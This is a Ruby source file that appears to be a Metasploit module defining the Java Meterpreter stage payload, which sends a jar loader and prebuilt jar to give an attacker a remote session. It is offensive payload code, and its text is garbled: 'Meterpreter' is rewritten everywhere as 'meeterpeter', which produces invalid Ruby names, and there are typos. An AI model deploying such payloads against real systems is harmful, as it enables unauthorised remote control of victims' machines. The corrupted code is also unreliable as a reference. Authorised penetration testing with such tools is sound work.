##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/java'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meeterpeter_java'
require 'msf/base/sessions/meeterpeter_options'


module Metasploit3
  include Msf::Sessions::meeterpeterOptions

  # The stager should have already included this
  #include Msf::Payload::Java

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Java meeterpeter',
      'Description'   => 'Run a meeterpeter server in Java',
      'Author'        => [
          'mihi', # all the hard work
          'egypt' # msf integration
        ],
      'Platform'      => 'java',
      'Arch'          => ARCH_JAVA,
      'PayloadCompat' =>
        {
          'Convention' => 'javasocket javaurl',
        },
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::meeterpeter_Java_Java))
    # Order matters.  Classes can only reference classes that have already
    # been sent.  The last .class must implement Stage, i.e. have a start()
    # method.
    #
    # The meeterpeter.class stage is just a jar loader, not really anything
    # to do with meeterpeter specifically.  This payload should eventually
    # be replaced with an actual meeterpeter stage so we don't have to send
    # a second jar.
    @stage_class_files = [
      [ "javapayload", "stage", "Stage.class" ],
      [ "com", "metasploit", "meeterpeter", "MemoryBufferURLConnection.class" ],
      [ "com", "metasploit", "meeterpeter", "MemoryBufferURLStreamHandler.class" ],
      # Must be last!
      [ "javapayload", "stage", "meeterpeter.class" ],
    ]
  end

  #
  # Override the Payload::Java version so we can load a prebuilt jar to be
  # used as the final stage; calls super to get the intermediate stager.
  #
  def generate_stage(opts={})
    # TODO: wire the UUID into the stage
    met = MetasploitPayloads.read('meeterpeter', 'meeterpeter.jar')

    # All of the dendencies to create a jar loader, followed by the length
    # of the jar and the jar itself.
    super(opts) + [met.length].pack("N") + met
  end

end
